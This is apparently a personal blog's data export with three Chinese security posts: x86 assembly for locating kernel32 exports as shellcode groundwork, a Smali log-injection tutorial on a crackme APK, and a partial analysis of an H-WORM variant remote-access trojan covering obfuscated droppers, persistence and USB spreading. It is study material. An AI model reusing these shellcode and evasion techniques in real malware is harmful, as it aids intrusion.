eax,[eax+ebx+78h];\n        add eax,ebx;\n        mov edi,[eax+1Ch];\n        add edi,ebx;     //edx = AddressOfFunctions这张表的基值(已经指向第一个无名函数了)\n        //查表，LoadLibraryW在kernel32中符号位为0x341    LoadLibraryA = 0x33e\n        //mov esi,341H;\n        mov esi,33EH; //LoadLibraryW\n        sub esi,1h;//可以不用管\n        mov eax,[edi+esi*4];\n        add eax,ebx;//LoadLibraryW的地址\n        push szModlePath\n        call eax    //eax = 获取dll的起始地址\n\n\n        mov esi,246h;//GetProcAddress\n        sub esi,1;\n        mov ecx,[edi+esi*4];\n        add ecx,ebx;\n\n        jmp L1\nszFuncName: _EMIT &#39;A&#39;\n            _EMIT &#39;d&#39;\n            _EMIT &#39;d&#39;\n            _EMIT 0x00\n            //硬编码字符串在代码段\nL1:\n        //push offset szFuncName;\n        push funcName;\n        push eax;\n        call ecx;//获取到funcName的地址，返回到eax中\n        //call eax;//执行这个func\n    }  \n     //函数返回都是eax方式返回\n}\n\nint main()\n{\n    FARPROC Addr =LoadLibA(&quot;user32.dll&quot;,&quot;MessageBoxA&quot;);\n\n    __asm\n    {\n        push 0;\n        push 0;\n        push 0;\n        push 0;\n        call eax;\n    }\n    return 0;\n}\n\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<p>开始前一定先了解下汇编的种类<code>https://blog.csdn.net/ye1223/article/details/79060434</code></p>\n<p>我这里只简述我学习的<strong>MASH汇编</strong>和<strong>内联的MASH格式</strong>的汇编</p>\n<h3 id=\"mash-汇编如下\"><a href=\"#mash-汇编如下\" class=\"headerlink\" title=\"mash 汇编如下\"></a>mash 汇编如下</h3><p>下面程序的目的是遍历Kernel32模块的导出函数和基值，在shellcode中可以用到</p>\n<pre><code class=\"mash\">.386\n.model flat,stdcall\noption casemap:none\n\n; 包含printf函数所在的头文件和库文件\ninclude msvcrt.inc ; 微软vc运行时库的头文件,\n           ; 一般包含的时c语言的各个头文件\nincludelib msvcrt.lib ; 包含头文件所对应的库文件\n\nassume fs:nothing\n\n.const ; 全局常量\ng_formtStr db &quot;%-40s      &quot;,0\ng_formtInt db &quot;%d &quot;,0ah,0\ng_formtHex db &quot;%08X &quot;,0ah,0\n\n.code\n\n\nGetA proc\n    LOCAL @addOfFunc;\n    LOCAL @AddOfName;\n    LOCAL @AddOfNaOrd;\n    LOCAL @Sum;\n\n    mov eax,fs:[48];fs表示当前线程的teb结构，eax为PEB的地址\n    mov eax,[eax+12];获取这个进程的导入dll\n    mov eax,[eax+28];获取PEB_LDR_DATA结构v \n    mov eax,[eax];获取第一个结构的值\n    mov eax,[eax];获取第一个结构的值\n\n\n\n    mov ebx,[eax+8h];ebx=dll基质\n    mov eax,[ebx+3ch]\n    mov eax,[eax+ebx+78h]\n    add eax,ebx\n\n    mov ecx,[eax+14h];//Sumfunc\n    mov edx,[eax+1ch];//AddressOfFunctions\n    mov esi,[eax+20h];//AddressOfNames\n    mov edi,[eax+24h];//AddressOfNameOrdinals\n    add edx,ebx;\n    add esi,ebx;\n    add edi,ebx;//edi 已经是第一个符号的地址（2字节）\n    mov @addOfFunc,edx;\n    mov @AddOfName,esi;\n    mov @AddOfNaOrd,edi;\n    ;mov ecx,10;\n    mov @Sum,ecx;\n\n    xor ecx,ecx;清空计数器\n\nLL1:\n\n\n    push ecx;因为printf会影响ecx,eax,edx的值，所以只要把这个push到栈中临时保存\n\n    mov eax,[esi+ecx*4];esi指向的是AddressOfNames的RVA表地址，每一个RVA都是一个DWORD 所以要*4\n    add eax,ebx;ebx是这个dll的基值\n\n     push eax ; offset 伪指令能够取到一个标识符的地址\n    push offset g_formtStr;输出格式\n    call crt__cprintf ; 调用函数\n    add esp,8;//打印Func名字 \n\n    pop ecx;把偏移pop出来使用\n\n    mov eax,@AddOfNaOrd;取符号表的基值\n    add eax,ecx;\n    add eax,ecx;这里的两个add是因为每个符号表只占一个WORD，（等于eax+ecx*2)\n    mov eax,[eax];拿出这个偏移的符号值\n    and eax,0FFFFh;应为eax是DWORD 而我们只要内存中的低四位，所以这样取\n    push ecx;还是因为prinf会破坏ecx的值\n\n     ;push eax ; offset 伪指令能够取到一个标识符的地址\n    ;push offset g_formtInt\n    ;call crt__cprintf ; 调用函数\n    ;add esp,8;//打印名字 \n\n    mov edx,@addOfFunc;\n    add edx,eax;\n    add edx,eax;\n    add edx,eax;\n    add edx,eax;这里也和上面一样，相当于edx+eax*4,因为函数地址=BaseAddressOfFunctions+对应符号表值\n    mov edx,[edx];取AddressOfFunctions指向的地址\n    add edx,ebx;这个地址是RVA要加上dll的BASE\n\n    ;call edx;\n\n    push edx ; offset 伪指令能够取到一个标识符的地址\n    push offset g_formtHex;a\n    call crt__cprintf ; 调用函数\n    add esp,8;//打印名字 \n\n    pop ecx\n    add ecx ,1;\n    cmp ecx,@Sum\n    jne LL1\n    ret\nGetA endp\n\nmain:\n    call GetA;\n    ret \nend main\nend </code></pre>\n<h3 id=\"内联汇编\"><a href=\"#内联汇编\" class=\"headerlink\" title=\"内联汇编\"></a>内联汇编</h3><p>使用这种汇编可以提高我们生产效率,完全可以写成shellcode，任何函数都能自己实现，自己调用，不需要静态导入函数，全部动态自己调用导入函数的API</p>\n<p>内联函数的硬编码确实是个麻烦事，找到了如下的解决方案，在代码段写数据，然后跳过他</p>\n<pre><code class=\"c\">#include &quot;windows.h&quot;\n\nFARPROC LoadLibA(char *szModlePath,char* funcName)\n{\n    /*\n    __IN szModlePath 要导入的dll地址\n    __IN funcName 要查询这个dll里面的具体函数名\n    __return 返回值是一个远call，保存的是这个funcName的地址\n    */\n    __asm\n    {\n        mov eax,FS:[30h];\n        mov eax,[eax+0Ch];\n        mov eax,[eax+1Ch];//这个是第一个ldr_data结构指向第一个模块\n        mov eax,[eax];//拿到第一个模块的门三地址  C:\\Windows\\system32\\KERNELBASE.dll\n        mov eax,[eax]//kernel32.dll\n        mov ebx,[eax+08h];//GetDllBase = ebx\n\n        //         现在进去dll内存操作\n        mov eax,[ebx+3Ch];\n        mov eax,[eax+ebx+78h];\n        add eax,ebx;\n        mov edi,[eax+1Ch];\n        add edi,ebx;     //edx = AddressOfFunctions这张表的基值(已经指向第一个无名函数了)\n        //查表，LoadLibraryW在kernel32中符号位为0x341    LoadLibraryA = 0x33e\n        //mov esi,341H;\n        mov esi,33EH; //LoadLibraryW\n        sub esi,1h;//可以不用管\n        mov eax,[edi+esi*4];\n        add eax,ebx;//LoadLibraryW的地址\n        push szModlePath\n        call eax    //eax = 获取dll的起始地址\n\n\n        mov esi,246h;//GetProcAddress\n        sub esi,1;\n        mov ecx,[edi+esi*4];\n        add ecx,ebx;\n\n        jmp L1\nszFuncName: _EMIT &#39;A&#39;\n            _EMIT &#39;d&#39;\n            _EMIT &#39;d&#39;\n            _EMIT 0x00\n            //硬编码字符串在代码段\nL1:\n        //push offset szFuncName;\n        push funcName;\n        push eax;\n        call ecx;//获取到funcName的地址，返回到eax中\n        //call eax;//执行这个func\n    }  \n     //函数返回都是eax方式返回\n}\n\nint main()\n{\n    FARPROC Addr =LoadLibA(&quot;user32.dll&quot;,&quot;MessageBoxA&quot;);\n\n    __asm\n    {\n        push 0;\n        push 0;\n        push 0;\n        push 0;\n        call eax;\n    }\n    return 0;\n}\n\n</code></pre>\n"},{"title":"Smali插桩","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png","date":"2020-03-30T16:00:00.000Z","_content":"\n## 前言\n\n大型程序不好直接调试，一个API 有可能多次调用，直接下断也是有印象，下面介绍下在smali中插入log代码达到调试的作用\n\nsmali源码可以随意加正规代码，就像汇编一样，只是可能修改后不能反编译成java代码\n\n### 工具介绍\n\nAndroid Killer V1.3.1.0（下面简称AK）\n\n夜神模拟器或真机\n\n演示APK：https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk\n\n## 过程\n\n**这里已经默认你安装过这个APK，知道他的一些行为**\n\n打开AK，加载目标APK，等待反编译完成\n\n打开项目的`Mainactivity.smali`的反编译代码\n\n![image-20200331134623301](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331134623301.png)\n\n逻辑还是很清晰的，这里设置了按钮的`OnClickListener`当点击时就会执行相关函数，也就是这里的`onClick`\n\n> 在反编译后的smali代码中，需要寻找equal判断的位置，在其进行输出getkey()返回值时插桩，由于功能唯一，代码位置很容易找到，在`com/mzheng/crackme1/MainActivity$1`文件中；\n>\n> BTW：为什么是MainActivity$1.smali而不是MainActivity.smali呢？\n>\n> 因为主要的判断逻辑是在OnClickListener这个类里，而这个类是MainActivity的一个内部类，同时我们在实现的时候也没有给这个类声明具体的名字，所以这个类用$1表示。实际环境会有很多`$+id`的文件，大多如此，多功能情况下还是搜索特殊字符或对怀疑位置进行插桩来判断实际功能位置；因为继承呢\n>\n> 引用自：https://www.bodkin.ren/index.php/archives/560/\n\n\n\n这里主要讲方法\n\n#### 法1：用Ak直接插入Log\n\n我们目的是修改`com/mzheng/crackme1/MainActivity$1`这个文件，达到把Getkey的返回值给打印出来\n\n\n\n![image-20200331142750849](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331142750849.png)\n\n\n\n在这个位置**右键->插入代码->log**\n\n\n\nAK会帮你插入这个方法，直接调用就行\n\n![image-20200331143003496](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png)\n\n\n\n把V0改为你要打印的数据，**一定记得要保存你的smali代码** AK编译的时候不会帮你保存，要你自己保存\n\n然后编译安装，注意箭头表注的地方\n\n![image-20200331171526913](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331143003496.png)\n\n\n\n最后打开日志，稍微过滤下就可以得到`Tag：AndroidKiller-string` 的消息\n\n![image-20200331171804535](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171526913.png)\n\n\n\n如果使用adb命令如下\n\n`adb logcat -s AndroidKiller-string`\n\n\n\n\n\n#### 法2 手动添加Log类\n\n原理和法1一样，只是这个稍微麻烦一点\n\n参考SewellDinG的方法\n\nhttps://github.com/SewellDinG/smaliArmory\n\n### 遇到的几个坑\n\n\n\n1. AK编译慢，老出错\n\n   网上给的方案，替换 **AndroidKiller_v1.3.1\\bin\\apktool\\apktool** 下的**ShakaApktool.jar** 吾爱盘中有\n\n2. AK找不到设备\n\n   现场时使用环境变量中的adb连接一下\n\n   adb connect 127.0.0.1:62001\n\n   点击刷新后，还是没有的话就用**AndroidKiller_v1.3.1\\bin\\apktool**中的adb去连，因为AK用的自己的adb工具\n\n3. AK回编不了\n\n   AK的apktool有很久没更新了，导致某些版本不能回编\n\n   但是这些都可以通过用高版本的apktool 手动敲命令替换，所以都不是问题\n\n## 总结\n\nsmali中可以插入任意代码，只要不影响程序运行，AK只是一个辅助工具，基本功能都是再apktool上实现的，所以它解决不了的还是老老实实敲代码吧！","source":"_posts/Smali 插桩.md","raw":"---\ntitle: Smali插桩\ntags: [Android]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png\ndate: 2020-3-31\n---\n\n## 前言\n\n大型程序不好直接调试，一个API 有可能多次调用，直接下断也是有印象，下面介绍下在smali中插入log代码达到调试的作用\n\nsmali源码可以随意加正规代码，就像汇编一样，只是可能修改后不能反编译成java代码\n\n### 工具介绍\n\nAndroid Killer V1.3.1.0（下面简称AK）\n\n夜神模拟器或真机\n\n演示APK：https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk\n\n## 过程\n\n**这里已经默认你安装过这个APK，知道他的一些行为**\n\n打开AK，加载目标APK，等待反编译完成\n\n打开项目的`Mainactivity.smali`的反编译代码\n\n![image-20200331134623301](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331134623301.png)\n\n逻辑还是很清晰的，这里设置了按钮的`OnClickListener`当点击时就会执行相关函数，也就是这里的`onClick`\n\n> 在反编译后的smali代码中，需要寻找equal判断的位置，在其进行输出getkey()返回值时插桩，由于功能唯一，代码位置很容易找到，在`com/mzheng/crackme1/MainActivity$1`文件中；\n>\n> BTW：为什么是MainActivity$1.smali而不是MainActivity.smali呢？\n>\n> 因为主要的判断逻辑是在OnClickListener这个类里，而这个类是MainActivity的一个内部类，同时我们在实现的时候也没有给这个类声明具体的名字，所以这个类用$1表示。实际环境会有很多`$+id`的文件，大多如此，多功能情况下还是搜索特殊字符或对怀疑位置进行插桩来判断实际功能位置；因为继承呢\n>\n> 引用自：https://www.bodkin.ren/index.php/archives/560/\n\n\n\n这里主要讲方法\n\n#### 法1：用Ak直接插入Log\n\n我们目的是修改`com/mzheng/crackme1/MainActivity$1`这个文件，达到把Getkey的返回值给打印出来\n\n\n\n![image-20200331142750849](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331142750849.png)\n\n\n\n在这个位置**右键->插入代码->log**\n\n\n\nAK会帮你插入这个方法，直接调用就行\n\n![image-20200331143003496](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png)\n\n\n\n把V0改为你要打印的数据，**一定记得要保存你的smali代码** AK编译的时候不会帮你保存，要你自己保存\n\n然后编译安装，注意箭头表注的地方\n\n![image-20200331171526913](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331143003496.png)\n\n\n\n最后打开日志，稍微过滤下就可以得到`Tag：AndroidKiller-string` 的消息\n\n![image-20200331171804535](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171526913.png)\n\n\n\n如果使用adb命令如下\n\n`adb logcat -s AndroidKiller-string`\n\n\n\n\n\n#### 法2 手动添加Log类\n\n原理和法1一样，只是这个稍微麻烦一点\n\n参考SewellDinG的方法\n\nhttps://github.com/SewellDinG/smaliArmory\n\n### 遇到的几个坑\n\n\n\n1. AK编译慢，老出错\n\n   网上给的方案，替换 **AndroidKiller_v1.3.1\\bin\\apktool\\apktool** 下的**ShakaApktool.jar** 吾爱盘中有\n\n2. AK找不到设备\n\n   现场时使用环境变量中的adb连接一下\n\n   adb connect 127.0.0.1:62001\n\n   点击刷新后，还是没有的话就用**AndroidKiller_v1.3.1\\bin\\apktool**中的adb去连，因为AK用的自己的adb工具\n\n3. AK回编不了\n\n   AK的apktool有很久没更新了，导致某些版本不能回编\n\n   但是这些都可以通过用高版本的apktool 手动敲命令替换，所以都不是问题\n\n## 总结\n\nsmali中可以插入任意代码，只要不影响程序运行，AK只是一个辅助工具，基本功能都是再apktool上实现的，所以它解决不了的还是老老实实敲代码吧！","slug":"Smali 插桩","published":1,"updated":"2020-03-31T10:45:45.956Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw628000sccuq7dvf2dg4","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>大型程序不好直接调试，一个API 有可能多次调用，直接下断也是有印象，下面介绍下在smali中插入log代码达到调试的作用</p>\n<p>smali源码可以随意加正规代码，就像汇编一样，只是可能修改后不能反编译成java代码</p>\n<h3 id=\"工具介绍\"><a href=\"#工具介绍\" class=\"headerlink\" title=\"工具介绍\"></a>工具介绍</h3><p>Android Killer V1.3.1.0（下面简称AK）</p>\n<p>夜神模拟器或真机</p>\n<p>演示APK：<a href=\"https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk</a></p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p><strong>这里已经默认你安装过这个APK，知道他的一些行为</strong></p>\n<p>打开AK，加载目标APK，等待反编译完成</p>\n<p>打开项目的<code>Mainactivity.smali</code>的反编译代码</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331134623301.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331134623301\"></p>\n<p>逻辑还是很清晰的，这里设置了按钮的<code>OnClickListener</code>当点击时就会执行相关函数，也就是这里的<code>onClick</code></p>\n<blockquote>\n<p>在反编译后的smali代码中，需要寻找equal判断的位置，在其进行输出getkey()返回值时插桩，由于功能唯一，代码位置很容易找到，在<code>com/mzheng/crackme1/MainActivity$1</code>文件中；</p>\n<p>BTW：为什么是MainActivity$1.smali而不是MainActivity.smali呢？</p>\n<p>因为主要的判断逻辑是在OnClickListener这个类里，而这个类是MainActivity的一个内部类，同时我们在实现的时候也没有给这个类声明具体的名字，所以这个类用$1表示。实际环境会有很多<code>$+id</code>的文件，大多如此，多功能情况下还是搜索特殊字符或对怀疑位置进行插桩来判断实际功能位置；因为继承呢</p>\n<p>引用自：<a href=\"https://www.bodkin.ren/index.php/archives/560/\" target=\"_blank\" rel=\"noopener\">https://www.bodkin.ren/index.php/archives/560/</a></p>\n</blockquote>\n<p>这里主要讲方法</p>\n<h4 id=\"法1：用Ak直接插入Log\"><a href=\"#法1：用Ak直接插入Log\" class=\"headerlink\" title=\"法1：用Ak直接插入Log\"></a>法1：用Ak直接插入Log</h4><p>我们目的是修改<code>com/mzheng/crackme1/MainActivity$1</code>这个文件，达到把Getkey的返回值给打印出来</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331142750849.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331142750849\"></p>\n<p>在这个位置<strong>右键-&gt;插入代码-&gt;log</strong></p>\n<p>AK会帮你插入这个方法，直接调用就行</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331143003496\"></p>\n<p>把V0改为你要打印的数据，<strong>一定记得要保存你的smali代码</strong> AK编译的时候不会帮你保存，要你自己保存</p>\n<p>然后编译安装，注意箭头表注的地方</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331143003496.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331171526913\"></p>\n<p>最后打开日志，稍微过滤下就可以得到<code>Tag：AndroidKiller-string</code> 的消息</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171526913.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331171804535\"></p>\n<p>如果使用adb命令如下</p>\n<p><code>adb logcat -s AndroidKiller-string</code></p>\n<h4 id=\"法2-手动添加Log类\"><a href=\"#法2-手动添加Log类\" class=\"headerlink\" title=\"法2 手动添加Log类\"></a>法2 手动添加Log类</h4><p>原理和法1一样，只是这个稍微麻烦一点</p>\n<p>参考SewellDinG的方法</p>\n<p><a href=\"https://github.com/SewellDinG/smaliArmory\" target=\"_blank\" rel=\"noopener\">https://github.com/SewellDinG/smaliArmory</a></p>\n<h3 id=\"遇到的几个坑\"><a href=\"#遇到的几个坑\" class=\"headerlink\" title=\"遇到的几个坑\"></a>遇到的几个坑</h3><ol>\n<li><p>AK编译慢，老出错</p>\n<p>网上给的方案，替换 <strong>AndroidKiller_v1.3.1\\bin\\apktool\\apktool</strong> 下的<strong>ShakaApktool.jar</strong> 吾爱盘中有</p>\n</li>\n<li><p>AK找不到设备</p>\n<p>现场时使用环境变量中的adb连接一下</p>\n<p>adb connect 127.0.0.1:62001</p>\n<p>点击刷新后，还是没有的话就用<strong>AndroidKiller_v1.3.1\\bin\\apktool</strong>中的adb去连，因为AK用的自己的adb工具</p>\n</li>\n<li><p>AK回编不了</p>\n<p>AK的apktool有很久没更新了，导致某些版本不能回编</p>\n<p>但是这些都可以通过用高版本的apktool 手动敲命令替换，所以都不是问题</p>\n</li>\n</ol>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>smali中可以插入任意代码，只要不影响程序运行，AK只是一个辅助工具，基本功能都是再apktool上实现的，所以它解决不了的还是老老实实敲代码吧！</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>大型程序不好直接调试，一个API 有可能多次调用，直接下断也是有印象，下面介绍下在smali中插入log代码达到调试的作用</p>\n<p>smali源码可以随意加正规代码，就像汇编一样，只是可能修改后不能反编译成java代码</p>\n<h3 id=\"工具介绍\"><a href=\"#工具介绍\" class=\"headerlink\" title=\"工具介绍\"></a>工具介绍</h3><p>Android Killer V1.3.1.0（下面简称AK）</p>\n<p>夜神模拟器或真机</p>\n<p>演示APK：<a href=\"https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk</a></p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p><strong>这里已经默认你安装过这个APK，知道他的一些行为</strong></p>\n<p>打开AK，加载目标APK，等待反编译完成</p>\n<p>打开项目的<code>Mainactivity.smali</code>的反编译代码</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331134623301.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331134623301\"></p>\n<p>逻辑还是很清晰的，这里设置了按钮的<code>OnClickListener</code>当点击时就会执行相关函数，也就是这里的<code>onClick</code></p>\n<blockquote>\n<p>在反编译后的smali代码中，需要寻找equal判断的位置，在其进行输出getkey()返回值时插桩，由于功能唯一，代码位置很容易找到，在<code>com/mzheng/crackme1/MainActivity$1</code>文件中；</p>\n<p>BTW：为什么是MainActivity$1.smali而不是MainActivity.smali呢？</p>\n<p>因为主要的判断逻辑是在OnClickListener这个类里，而这个类是MainActivity的一个内部类，同时我们在实现的时候也没有给这个类声明具体的名字，所以这个类用$1表示。实际环境会有很多<code>$+id</code>的文件，大多如此，多功能情况下还是搜索特殊字符或对怀疑位置进行插桩来判断实际功能位置；因为继承呢</p>\n<p>引用自：<a href=\"https://www.bodkin.ren/index.php/archives/560/\" target=\"_blank\" rel=\"noopener\">https://www.bodkin.ren/index.php/archives/560/</a></p>\n</blockquote>\n<p>这里主要讲方法</p>\n<h4 id=\"法1：用Ak直接插入Log\"><a href=\"#法1：用Ak直接插入Log\" class=\"headerlink\" title=\"法1：用Ak直接插入Log\"></a>法1：用Ak直接插入Log</h4><p>我们目的是修改<code>com/mzheng/crackme1/MainActivity$1</code>这个文件，达到把Getkey的返回值给打印出来</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331142750849.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331142750849\"></p>\n<p>在这个位置<strong>右键-&gt;插入代码-&gt;log</strong></p>\n<p>AK会帮你插入这个方法，直接调用就行</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331143003496\"></p>\n<p>把V0改为你要打印的数据，<strong>一定记得要保存你的smali代码</strong> AK编译的时候不会帮你保存，要你自己保存</p>\n<p>然后编译安装，注意箭头表注的地方</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331143003496.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331171526913\"></p>\n<p>最后打开日志，稍微过滤下就可以得到<code>Tag：AndroidKiller-string</code> 的消息</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171526913.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200331171804535\"></p>\n<p>如果使用adb命令如下</p>\n<p><code>adb logcat -s AndroidKiller-string</code></p>\n<h4 id=\"法2-手动添加Log类\"><a href=\"#法2-手动添加Log类\" class=\"headerlink\" title=\"法2 手动添加Log类\"></a>法2 手动添加Log类</h4><p>原理和法1一样，只是这个稍微麻烦一点</p>\n<p>参考SewellDinG的方法</p>\n<p><a href=\"https://github.com/SewellDinG/smaliArmory\" target=\"_blank\" rel=\"noopener\">https://github.com/SewellDinG/smaliArmory</a></p>\n<h3 id=\"遇到的几个坑\"><a href=\"#遇到的几个坑\" class=\"headerlink\" title=\"遇到的几个坑\"></a>遇到的几个坑</h3><ol>\n<li><p>AK编译慢，老出错</p>\n<p>网上给的方案，替换 <strong>AndroidKiller_v1.3.1\\bin\\apktool\\apktool</strong> 下的<strong>ShakaApktool.jar</strong> 吾爱盘中有</p>\n</li>\n<li><p>AK找不到设备</p>\n<p>现场时使用环境变量中的adb连接一下</p>\n<p>adb connect 127.0.0.1:62001</p>\n<p>点击刷新后，还是没有的话就用<strong>AndroidKiller_v1.3.1\\bin\\apktool</strong>中的adb去连，因为AK用的自己的adb工具</p>\n</li>\n<li><p>AK回编不了</p>\n<p>AK的apktool有很久没更新了，导致某些版本不能回编</p>\n<p>但是这些都可以通过用高版本的apktool 手动敲命令替换，所以都不是问题</p>\n</li>\n</ol>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>smali中可以插入任意代码，只要不影响程序运行，AK只是一个辅助工具，基本功能都是再apktool上实现的，所以它解决不了的还是老老实实敲代码吧！</p>\n"},{"title":"H-WORM变种远控分析","date":"2019-09-04T11:11:22.000Z","index_img":"https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_4c746d4df0.jpg","banner_img":"https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_4c746d4df0.jpg","_content":"\n\n\n## 基本信息\n\n|FileName| FileType|MD5|Size|\n|--|--|--|--|\n| 4gdrwceq60b7dbl.sct| rat  |69B7D326575C5616D82645960B3D081A|403845 bytes|\n\n## 简介\n该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。\n\n\n## 流程图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916190802115.png)\n## 详细分析\n这个样本母体总共会释放3个脚本\n### 脚本1\n首先我们看看`4gdrwceq60b7dbl.sct`，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件\n我们用`Sublimi Text`来打开它，记事本也是可以的。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916155338357.png)\n利用组数来存关键字符串，通过字符串的拼接来合成完整路径\n会尝试删除`%APPDATA%\\\\taskmgr.js`  这个文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916155609819.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916160236624.png)\n文件中有很长一段密文，这里我改名为了`EncodeList`，通过`System.IO.MemoryStream.WriteByte()`方法把数据读入数据流中。\n最重要的是使用`ADODB.Stream`类方法把这个数据流保存到了被上面删除掉的`%APPDATA%\\\\taskmgr.js`文件中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916155832544.png)\n最后使用`WScript.Shell.Run`方法运行`taskmgr.js`文件\n\n我这里使Python给他拿出来，命名为`taskmgr.js`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916161513776.png)\n### 脚本2\n下面是`taskmgr.js` ，这个脚本其实还是一个解密脚本，也是 使用`AdoDB.Stream`处理数据流，然后使用`monKeyKing`中动态生成的eval方法去执行数据，来达到免杀\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916162014581.png)\n通过一个`Microsoft.XmlDom`的创建一个`tmp`对象，然后把这个对象赋予`eval`方法\n最后就可以用`this.p`去访问到`Microsoft.XmlDom.tmp`，来达到命令执行\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916162041325.png)\n当然执行的命令也肯定是被加过密的，下面就是解密数据部分，这里就简单的把base64后的结果，然后把字符\"A\"替换成\"!-%\"\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916163628179.png)\n\n最后使用上面构造的`eval`去执行这段解密的代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091616391031.png)\n\n### 脚本3 核心代码\n这里开始分析脚本2中解密出来的代码\n\n根据这host，port和代码量，可以判断出这个应该就是这个样本的实现核心的地方了。\n这里其实这是一个远控加感染U盘传播\n#### U盘传播\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916165932567.png)\n加入开机启动注册表项，来达到持久化攻击，这基本已是木马的共性\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916170039587.png)\n\n在下面的try块中，有一个install函数会被循环调用，这个函数是用来检测感染移动存储设备的\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916170300961.png)\ninstall() 会去判断当前系统磁盘是否有U盘或其他移动存储介质，有的话就执行感染操作\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916170657111.png)\n枚举移动盘文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916171010711.png)\n如果文件不是快捷方式，那就将权限改为**隐藏**和**系统权限**，然后给他们创建一个同名`.lnk`的快捷方式\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916171254264.png)\n快捷方式被修改为了特殊构造的恶意代码，构造过程如下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916171656803.png)\n这样每个文件都会被隐藏，然后生成一个被感染的快捷方式去诱惑其他人点击，只要一点击，就会被感染。\n\n#### 远控模块\n\n这个远控一共有`26`个命令模块，分别是\n|命令  |含义  |\n|--|--|\n|disconnect|   断开连接 |\n|reboot|   重启脚本 |\n|shutdown| 关闭脚本 |\n|excecute| 执行命令  |\n|install-sdk|  安装SDK |\n|get-pass|搜集密码  |\n|get-pass-offline|  获取浏览器密码|\n|update|    更新|\n|uninstall| 卸载|\n|up-n-exec| 请求下载执行文件|\n|bring-log| 上传日志|\n|down-n-exec|  下载执行文件 |\n|filemanager|   文件管理|\n|rdp|  启动RDP |\n|keylogger| 